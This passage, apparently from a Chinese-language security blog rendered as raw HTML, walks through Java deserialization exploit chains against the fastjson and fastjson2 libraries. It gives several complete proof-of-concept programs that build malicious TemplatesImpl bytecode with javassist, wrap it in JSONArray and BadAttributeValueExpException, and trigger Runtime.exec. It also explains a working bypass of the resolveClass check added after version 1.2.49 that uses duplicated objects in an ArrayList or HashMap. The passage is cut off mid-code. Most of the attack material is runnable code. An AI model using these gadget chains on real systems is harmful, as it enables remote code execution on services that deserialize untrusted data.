class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111336619.png" alt="image-20241011133609518"></p><p>fastjson2åˆ©ç”¨</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson2.JSONArray;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111341193.png" alt="image-20241011134159108"></p><p>JSONObjectçš„åˆ©ç”¨ä¹Ÿä¸€æ ·ï¼Œå°±ä¸å†å†™ä¸€éäº†</p><h1 id="ä¸ºä»€ä¹ˆfastjson1249ä»¥åä¸å†èƒ½åˆ©ç”¨"><a href="#ä¸ºä»€ä¹ˆfastjson1-2-49ä»¥åä¸å†èƒ½åˆ©ç”¨" class="headerlink" title="ä¸ºä»€ä¹ˆfastjson1.2.49ä»¥åä¸å†èƒ½åˆ©ç”¨"></a>ä¸ºä»€ä¹ˆfastjson1.2.49ä»¥åä¸å†èƒ½åˆ©ç”¨</h1><p>å› ä¸ºä»1.2.49å¼€å§‹ï¼ŒJSONArrayä»¥åŠJSONObjectæ–¹æ³•å¼€å§‹æœ‰äº†è‡ªå·±çš„readObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410111346927.png" alt="image-20241011134629872"></p><p>åœ¨å…¶<code>SecureObjectInputStream</code>ç±»å½“ä¸­é‡å†™äº†<code>resolveClass</code>,åœ¨å…¶ä¸­è°ƒç”¨äº†<code>checkAutoType</code>æ–¹æ³•åšç±»çš„æ£€æŸ¥</p><p><img src="https://cdn.clown2024.cn/202410111350600.png" alt="image-20241011135009543"></p><p>æ‰€ä»¥åé¢å°±æ˜¯æˆ‘ä»¬å¦‚ä½•è¿›è¡Œç»•è¿‡çš„é—®é¢˜äº†</p><h1 id="fastjson1249åç»•è¿‡"><a href="#fastjson1-2-49åç»•è¿‡" class="headerlink" title="fastjson1.2.49åç»•è¿‡"></a>fastjson1.2.49åç»•è¿‡</h1><p>ä»–æ£€æŸ¥çš„é€»è¾‘æ˜¯è¿™æ ·çš„ï¼Œå½“è°ƒç”¨JSONArray&#x2F;JSONObjectçš„Objectæ–¹æ³•è§¦å‘ååºåˆ—åŒ–æ—¶ï¼Œå°†è¿™ä¸ªååºåˆ—åŒ–è¿‡ç¨‹å§”æ‰˜ç»™<code>SecureObjectInputStream</code>å¤„ç†æ—¶ï¼Œè§¦å‘resolveClasså®ç°å¯¹æ¶æ„ç±»çš„æ‹¦æˆª</p><p>çœ‹èµ·æ¥å¾ˆæ­£å¸¸ï¼Œä½†å®é™…ä¸Šä»–çš„ååºåˆ—åŒ–çš„é€»è¾‘æ˜¯ä¸å®‰å…¨ï¼Œä»–æ˜¯ä¸å®‰å…¨çš„ObjectInputStreamå¥—ä¸ªå®‰å…¨çš„SecureObjectInputStreamå¯¼è‡´äº†ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ObjectInputStream -&gt; readObject<br>xxxxxx(çœç•¥ä¸­é—´è¿‡ç¨‹)<br>SecureObjectInputStream -&gt; readObject -&gt; resolveClass<br></code></pre></td></tr></table></figure><p><strong>å®‰å…¨çš„ååºåˆ—åŒ–å†™æ³•</strong></p><p>æˆ‘ä»¬æ­£å¸¸çš„å®‰å…¨ååºåˆ—åŒ–å†™æ³•åº”è¯¥æ˜¯è¿™æ ·çš„ï¼Œç”Ÿæˆä¸€ä¸ªç»§æ‰¿ObjectInputStreamçš„ç±»å¹¶é‡å†™resolveClass(å‡å®šä¸ºTestInputStream)ï¼Œç”±å®ƒæ¥åšååºåˆ—åŒ–çš„å…¥å£ï¼Œè¿™æ ·æ‰æ˜¯å®‰å…¨çš„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TestInputStream -&gt; readObject -&gt; resolveClass<br></code></pre></td></tr></table></figure><p><strong>å¦‚ä½•ç»•è¿‡</strong></p><p>é‚£æˆ‘ä»¬çš„ç»•è¿‡æ€è·¯å°±æ˜¯å¦‚æœåœ¨ä¸­é—´çš„ç©ºæ¡£æœŸåšä¸€äº›æ‰‹è„šï¼Œè®©ä»–ä¸è¿›å…¥åˆ°resolveClassé‡Œé¢</p><p>å…³é”®åœ¨ObjectInputStream#readObject0é‡Œé¢ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202410111558059.png" alt="image-20241011155830987"></p><p>ä»–ä¼šæ ¹æ®è¯»åˆ°çš„bytesä¸­tcçš„æ•°æ®ç±»å‹åšä¸åŒçš„å¤„ç†å»æ¢å¤éƒ¨åˆ†å¯¹è±¡</p><p>åœ¨ä¸åŒçš„caseä¸­ï¼Œå¤§éƒ¨åˆ†ç±»éƒ½ä¼šæœ€ç»ˆè°ƒç”¨<code>readClassDesc</code>å»è·å–ç±»çš„æè¿°ç¬¦ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å¦‚æœå½“å‰ååºåˆ—åŒ–æ•°æ®ä¸‹ä¸€ä½ä»ç„¶æ˜¯<code>TC_CLASSDESC</code>é‚£ä¹ˆå°±ä¼šåœ¨<code>readNonProxyDesc</code>ä¸­è§¦å‘<code>resolveClass</code></p><p><img src="https://cdn.clown2024.cn/202410111611096.png" alt="image-20241011161140045"></p><p><img src="https://cdn.clown2024.cn/202410111611784.png" alt="image-20241011161152724"></p><p>ç„¶ååˆ†æ”¯ä¸­ï¼Œä¸ä¼šè°ƒç”¨<code>readClassDesc</code>çš„åˆ†æ”¯æœ‰<code>TC_NULL</code>ã€<code>TC_REFERENCE</code>ã€<code>TC_STRING</code>ã€<code>TC_LONGSTRING</code>ã€<code>TC_EXCEPTION</code>ï¼Œstringä¸nullè¿™ç§å¯¹æˆ‘ä»¬æ¯«æ— ç”¨å¤„çš„ï¼Œexceptionç±»å‹åˆ™æ˜¯è§£å†³åºåˆ—åŒ–ç»ˆæ­¢ç›¸å…³ä¹Ÿæ²¡ä»€ä¹ˆç”¨ï¼Œé‚£ä¹ˆå°±åªå‰©ä¸‹Referenceå¼•ç”¨ç±»å‹äº†ã€‚</p><h2 id="å¼•ç”¨ç±»å‹åˆ©ç”¨"><a href="#å¼•ç”¨ç±»å‹åˆ©ç”¨" class="headerlink" title="å¼•ç”¨ç±»å‹åˆ©ç”¨"></a>å¼•ç”¨ç±»å‹åˆ©ç”¨</h2><p>æˆ‘ä»¬éœ€è¦åœ¨JSONArray&#x2F;JSONObjectå¯¹è±¡ååºåˆ—åŒ–æ¢å¤å¯¹è±¡æ—¶ï¼Œè®©æˆ‘ä»¬çš„æ¶æ„ç±»æˆä¸ºå¼•ç”¨ç±»å‹ä»è€Œç»•è¿‡resolveClassçš„æ£€æŸ¥</p><p>æ–¹æ³•å°±æ˜¯å‘Listã€setã€mapç±»å‹ä¸­æ·»åŠ åŒæ ·å¯¹è±¡æ—¶å³å¯æˆåŠŸåˆ©ç”¨</p><p><strong>åŸç†åˆ†æ</strong></p><p>åˆ†æä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson1Usual</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//ç”Ÿæˆæ¶æ„ç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        ArrayList&lt;Object&gt; arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        arrayList.add(templates);<br>        arrayList.add(templates);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(arrayList);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å†™å…¥å¯¹è±¡çš„æ—¶å€™ä¼šèµ°åˆ°writeObject0è¿™ä¸ªæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410111631619.png" alt="image-20241011163106557"></p><p>è¿™é‡Œçš„æ³¨é‡Šç¿»è¯‘ä¸€ä¸‹å°±æ˜¯å¤„ç†ä»¥å‰å†™å…¥ä¸”ä¸å¯æ›¿æ¢çš„å¯¹è±¡</p><p>ç„¶åèµ°åˆ°ArrayList#writeObject</p><p><img src="https://cdn.clown2024.cn/202410111641589.png" alt="image-20241011164111537"></p><p>ç„¶åè·Ÿè¿›å»</p><p><img src="https://cdn.clown2024.cn/202410111641984.png" alt="image-20241011164143924"></p><p>è¿™æ¬¡ä¼ çš„æ˜¯TemplatesImplç±»ï¼Œæˆ‘ä»¬ç¬¬ä¸€æ¬¡å†™çš„æ—¶å€™ä»–ä¼šåœ¨handleså“ˆå¸Œè¡¨ä¸­å»ºç«‹æ˜ å°„</p><p>å½“æˆ‘ä»¬å†æ¬¡å†™å…¥çš„æ—¶å€™ï¼Œä»–åœ¨æŸ¥è¯¢çš„æ—¶å€™å°±ä¸ä¼šè¿”å›-1</p><p><img src="https://cdn.clown2024.cn/202410111646059.png" alt="image-20241011164654999"></p><p>ç„¶åå°±å¯ä»¥è¿›å…¥åˆ°writeHandleæ–¹æ³•é‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202410111647745.png" alt="image-20241011164743700"></p><p>å¯ä»¥çœ‹åˆ°ä»–å°†é‡å¤å¯¹è±¡ä»¥å¼•ç”¨ç±»å‹å†™å…¥ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡resolveClassçš„æ£€æŸ¥äº†</p><h2 id="åˆ©ç”¨é“¾æ„é€ "><a href="#åˆ©ç”¨é“¾æ„é€ -1" class="headerlink" title="åˆ©ç”¨é“¾æ„é€ "></a>åˆ©ç”¨é“¾æ„é€ </h2><p>æ–‡ç« çš„ç®€å•åˆ©ç”¨ä»£ç æ€è·¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TemplatesImpl templates = TemplatesImplUtil.getEvilClass(&quot;clac&quot;);<br>ArrayList&lt;Object&gt; arrayList = new ArrayList&lt;&gt;();<br>arrayList.add(templates);<br><br>JSONArray jsonArray = new JSONArray();<br>jsonArray.add(templates);<br><br>BadAttributeValueExpException bd = getBadAttributeValueExpException(jsonArray);<br>arrayList.add(bd);<br>  <br>WriteObjects(arrayList);<br></code></pre></td></tr></table></figure><p>æ–‡ç« çš„æ€è·¯è§£é‡Šï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">åºåˆ—åŒ–æ—¶ï¼Œåœ¨è¿™é‡Œtemplateså…ˆåŠ å…¥åˆ°arrayListä¸­ï¼Œåé¢åœ¨JSONArrayä¸­å†æ¬¡åºåˆ—åŒ–TemplatesImplæ—¶ï¼Œç”±äºåœ¨handlesè¿™ä¸ªhashè¡¨ä¸­æŸ¥åˆ°äº†æ˜ å°„ï¼Œåç»­åˆ™ä¼šä»¥å¼•ç”¨å½¢å¼è¾“å‡º<br><br>ååºåˆ—åŒ–æ—¶ArrayListå…ˆé€šè¿‡readObjectæ¢å¤TemplatesImplå¯¹è±¡ï¼Œä¹‹åæ¢å¤BadAttributeValueExpExceptionå¯¹è±¡ï¼Œåœ¨æ¢å¤è¿‡ç¨‹ä¸­ï¼Œç”±äºBadAttributeValueExpExceptionè¦æ¢å¤valå¯¹åº”çš„JSONArray/JSONObjectå¯¹è±¡ï¼Œä¼šè§¦å‘JSONArray/JSONObjectçš„readObjectæ–¹æ³•ï¼Œå°†è¿™ä¸ªè¿‡ç¨‹å§”æ‰˜ç»™SecureObjectInputStreamï¼Œåœ¨æ¢å¤JSONArray/JSONObjectä¸­çš„TemplatesImplå¯¹è±¡æ—¶ï¼Œç”±äºæ­¤æ—¶çš„ç¬¬äºŒä¸ªTemplatesImplå¯¹è±¡æ˜¯å¼•ç”¨ç±»å‹ï¼Œé€šè¿‡readHandleæ¢å¤å¯¹è±¡çš„é€”ä¸­ä¸ä¼šè§¦å‘resolveClassï¼Œç”±æ­¤å®ç°äº†ç»•è¿‡<br><br>Setã€Mapç±»å‹ä¹Ÿæ˜¯è¿™æ ·çš„ç»•è¿‡<br></code></pre></td></tr></table></figure><p>ç°åœ¨å°±å¯ä»¥å†™expäº†ï¼Œæ”¹æˆfastjson1.2.83ç‰ˆæœ¬æ¥æ‰“</p><p>ArrayListçš„ç‰ˆæœ¬</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson1Usual</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//ç”Ÿæˆæ¶æ„ç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        ArrayList&lt;Object&gt; arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        arrayList.add(templates);<br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br><br>        arrayList.add(val);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(arrayList);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111703825.png" alt="image-20241011170336723"></p><blockquote><p>è¿™é‡Œä¸€å¼€å§‹æˆ‘è‡ªå·±å†™ç›´æ¥ç®€å•ç²—æš´arrayliståŠ äº†ä¸¤æ¬¡ï¼Œç„¶åæŠŠarraylistæ”¾JSONArrayé‡Œï¼Œå¯¼è‡´æ‰“ä¸é€šï¼Œåæ¥ä¸€æƒ³éƒ½æ”¾é‡Œé¢çš„è¯æœ‰ä¸€ä¸ªä¼šä¸æ˜¯å¼•ç”¨ç±»å‹ï¼Œå¯¼è‡´ä»–ç»è¿‡resolveClassä¹‹åä¼šæå‰æŠ›å‡ºå¼‚å¸¸ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— è®ºæ˜¯Listè¿˜æ˜¯Mapï¼Œéƒ½æ˜¯è¦åŒ…è£¹åœ¨å¤–é¢çš„ï¼Œä½¿å…¶ç¬¬ä¸€ä¸ªç±»ååºåˆ—åŒ–çš„æ—¶å€™ä¸ç»è¿‡resolveClass</p></blockquote><p>æ–‡ç« çš„HashMapçš„ç‰ˆæœ¬</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title 